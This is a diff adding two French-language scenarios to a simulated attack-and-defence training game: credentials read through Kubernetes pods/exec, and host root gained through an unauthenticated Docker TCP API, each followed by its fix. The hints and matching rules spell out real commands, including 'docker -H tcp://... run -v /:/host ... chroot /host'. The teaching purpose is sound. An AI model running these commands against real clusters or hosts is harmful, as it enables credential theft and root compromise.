@@ -4882,6 +4882,150 @@ const SCENARIOS = [
     log.push({t:"[+] Secret de production récupéré depuis un tout autre compte cloud.", cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 62. Secret Kubernetes injecté en clair (exposé via pods/exec) ===================== */
+{
+  id:'k8s-secret-env-plaintext-exec-exposure',
+  title:'Un mot de passe injecté en clair comme variable d\'environnement se lit via un simple droit pods/exec',
+  category:'Conteneurs & orchestration (secret en clair, exposition via pods/exec)',
+  attack:{
+    who:'Vous incarnez bob, disposant uniquement des droits `pods/exec` et `pods/get` dans le namespace `billing` — sans le moindre droit de lecture sur les Secrets eux-mêmes.',
+    desc:"Le déploiement `billing-api` injecte directement le mot de passe de la base de données comme variable d'environnement en clair (`DB_PASSWORD`), au lieu de le monter comme fichier depuis un Secret. N'importe qui disposant du droit `pods/exec` — bien moindre que le droit de lire les Secrets — peut donc le récupérer directement depuis l'intérieur du conteneur en cours d'exécution.",
+    hints:[
+      "`kubectl get secrets -n billing` confirme que vous n'avez aucun droit de lecture sur les Secrets de ce namespace — la voie directe est fermée.",
+      "`kubectl exec -n billing deploy/billing-api -- env` liste les variables d'environnement du conteneur en cours d'exécution : `DB_PASSWORD` y apparaît en clair, puisqu'il a été injecté directement plutôt que monté comme fichier.",
+      "Le droit `pods/exec` seul suffit à lire cette variable, alors qu'il ne devrait donner qu'un accès de dépannage au conteneur — pas un accès équivalent à la lecture des Secrets du namespace."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du cluster chargé de corriger la faille.',
+    desc:"Montez le mot de passe comme fichier depuis le Secret plutôt que comme variable d'environnement, pour qu'il n'apparaisse plus jamais dans la sortie de `env` — un droit `pods/exec` isolé ne doit pas suffire à exfiltrer un secret applicatif.",
+    hints:[
+      "Éditez `/etc/kubernetes/manifests/billing-api-deployment.yaml` avec `nano` et passez `dbPasswordViaEnv` à `false` (le mot de passe est alors monté comme fichier dans `/etc/secrets/db-password`, jamais listé par `env`).",
+      "`verify` confirme que le mot de passe n'est plus injecté comme variable d'environnement en clair."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['kubernetes']},
+      '/etc/kubernetes':{type:'dir',perm:'755',owner:'root',children:['manifests']},
+      '/etc/kubernetes/manifests':{type:'dir',perm:'755',owner:'root',children:['billing-api-deployment.yaml']},
+      '/etc/kubernetes/manifests/billing-api-deployment.yaml':{type:'file',perm:'644',owner:'root',size:90,
+        content:"deployment: billing-api\nnamespace: billing\ndbPasswordViaEnv: true\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^kubectl\s+get\s+secrets\s+-n\s+billing$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.rbacChecked = true;
+        print('Error from server (Forbidden): secrets is forbidden: User "bob" cannot list resource "secrets" in namespace "billing"', 'err');
+      }
+    },
+    { pattern:/^kubectl\s+exec\s+-n\s+billing\s+deploy\/billing-api\s+--\s+env$/, run(state, print){
+        const viaEnv = /dbPasswordViaEnv:\s*true/.test(state.vfs['/etc/kubernetes/manifests/billing-api-deployment.yaml'].content);
+        if(!viaEnv){
+          print('PATH=/usr/local/bin:/usr/bin:/bin\nHOSTNAME=billing-api-7d9f6\nDB_HOST=billing-db.billing.svc.cluster.local', 'out');
+          return;
+        }
+        state.flags = state.flags || {};
+        state.flags.envRead = true;
+        print('PATH=/usr/local/bin:/usr/bin:/bin\nHOSTNAME=billing-api-7d9f6\nDB_HOST=billing-db.billing.svc.cluster.local\nDB_PASSWORD=B1lling$ecure2024', 'ok');
+        print("[+] Mot de passe de la base de données lu en clair via un simple droit pods/exec, sans le moindre accès aux Secrets.", 'ok');
+        print("FLAG{k8s_secret_env_plaintext_pods_exec_exposure}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.envRead === true; },
+  defenseCheck(state){ return !/dbPasswordViaEnv:\s*true/.test(state.vfs['/etc/kubernetes/manifests/billing-api-deployment.yaml'].content); },
+  replay(state){
+    const log=[];
+    const viaEnv = /dbPasswordViaEnv:\s*true/.test(state.vfs['/etc/kubernetes/manifests/billing-api-deployment.yaml'].content);
+    log.push({t:'$ kubectl exec -n billing deploy/billing-api -- env', cls:'prompt-line'});
+    if(!viaEnv){
+      log.push({t:'PATH=/usr/local/bin:/usr/bin:/bin\nHOSTNAME=billing-api-7d9f6\nDB_HOST=billing-db...', cls:'err'});
+      log.push({t:"[-] Le mot de passe est désormais monté comme fichier, plus jamais listé par env : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'DB_PASSWORD=B1lling$ecure2024', cls:'ok'});
+    log.push({t:"[+] Mot de passe lu en clair via un simple droit pods/exec.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 63. API Docker distante non authentifiée ===================== */
+{
+  id:'docker-api-tcp-unauthenticated',
+  title:'Le démon Docker écoute sur TCP sans authentification TLS, ouvrant un accès root distant sur l\'hôte',
+  category:'Conteneurs & orchestration (API Docker distante non authentifiée)',
+  attack:{
+    who:'Vous incarnez bob, disposant simplement d\'un accès réseau au démon Docker de target-lab, exposé sur TCP/2375.',
+    desc:"Le démon Docker de target-lab écoute sur TCP/2375 sans authentification TLS par certificat client. N'importe qui sur le réseau peut donc piloter Docker à distance — lister les conteneurs, en lancer de nouveaux, ou monter l'intégralité du système de fichiers de l'hôte dans un conteneur privilégié : un accès équivalent à root sur l'hôte lui-même.",
+    hints:[
+      "`docker -H tcp://target-lab:2375 ps` liste les conteneurs en cours d'exécution sans la moindre authentification requise.",
+      "Rien n'empêche de lancer un nouveau conteneur depuis cette API distante, avec n'importe quelle option — y compris un montage de volume vers la racine du système de fichiers hôte.",
+      "`docker -H tcp://target-lab:2375 run -v /:/host --rm alpine chroot /host id` monte l'intégralité du système de fichiers de l'hôte dans un nouveau conteneur et y exécute une commande : le résultat est celui d'un utilisateur root sur l'hôte lui-même, en dehors de tout confinement."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
+    desc:"Retirez l'écoute TCP non authentifiée du démon Docker, pour qu'il ne soit plus pilotable qu'en local via son socket Unix (ou via TCP avec authentification TLS mutuelle, si un accès distant reste nécessaire).",
+    hints:[
+      "Éditez `/etc/docker/daemon.json` avec `nano` et remplacez `\"hosts\": [\"tcp://0.0.0.0:2375\"]` par `\"hosts\": [\"unix:///var/run/docker.sock\"]`.",
+      "`verify` confirme que le démon Docker n'écoute plus sur TCP sans authentification."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['docker']},
+      '/etc/docker':{type:'dir',perm:'755',owner:'root',children:['daemon.json']},
+      '/etc/docker/daemon.json':{type:'file',perm:'644',owner:'root',size:70,
+        content:"{\n  \"hosts\": [\"tcp://0.0.0.0:2375\"],\n  \"tlsverify\": false\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^docker\s+-H\s+tcp:\/\/target-lab:2375\s+ps$/, run(state, print){
+        const exposed = /tcp:\/\//.test(state.vfs['/etc/docker/daemon.json'].content);
+        if(!exposed){ print("error during connect: this error may indicate that the docker daemon is not listening on tcp", 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.enumerated = true;
+        print('CONTAINER ID   IMAGE          STATUS\n3f9a1c2b7e4d   billing-api    Up 3 hours\n8b2e0f4a9c1d   redis:7        Up 3 hours', 'out');
+      }
+    },
+    { pattern:/^docker\s+-H\s+tcp:\/\/target-lab:2375\s+run\s+-v\s+\/:\/host\s+--rm\s+alpine\s+chroot\s+\/host\s+id$/, run(state, print){
+        const exposed = /tcp:\/\//.test(state.vfs['/etc/docker/daemon.json'].content);
+        if(!exposed){ print("error during connect: this error may indicate that the docker daemon is not listening on tcp", 'err'); return; }
+        if(!state.flags || !state.flags.enumerated){ print('docker: aucune connexion établie — vérifiez d\'abord que le démon répond.', 'err'); return; }
+        state.flags.hostRoot = true;
+        print('uid=0(root) gid=0(root) groups=0(root)', 'ok');
+        print("[+] Système de fichiers hôte monté et commande exécutée comme root sur l'hôte, hors de tout confinement.", 'ok');
+        print("FLAG{docker_api_tcp_unauthenticated_host_root}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.hostRoot === true; },
+  defenseCheck(state){ return !/tcp:\/\//.test(state.vfs['/etc/docker/daemon.json'].content); },
+  replay(state){
+    const log=[];
+    const exposed = /tcp:\/\//.test(state.vfs['/etc/docker/daemon.json'].content);
+    log.push({t:'$ docker -H tcp://target-lab:2375 run -v /:/host --rm alpine chroot /host id', cls:'prompt-line'});
+    if(!exposed){
+      log.push({t:'error during connect: this error may indicate that the docker daemon is not listening on tcp', cls:'err'});
+      log.push({t:"[-] Le démon Docker n'écoute plus sur TCP sans authentification : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'uid=0(root) gid=0(root) groups=0(root)', cls:'ok'});
+    log.push({t:"[+] Commande exécutée comme root sur l'hôte via l'API Docker distante.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
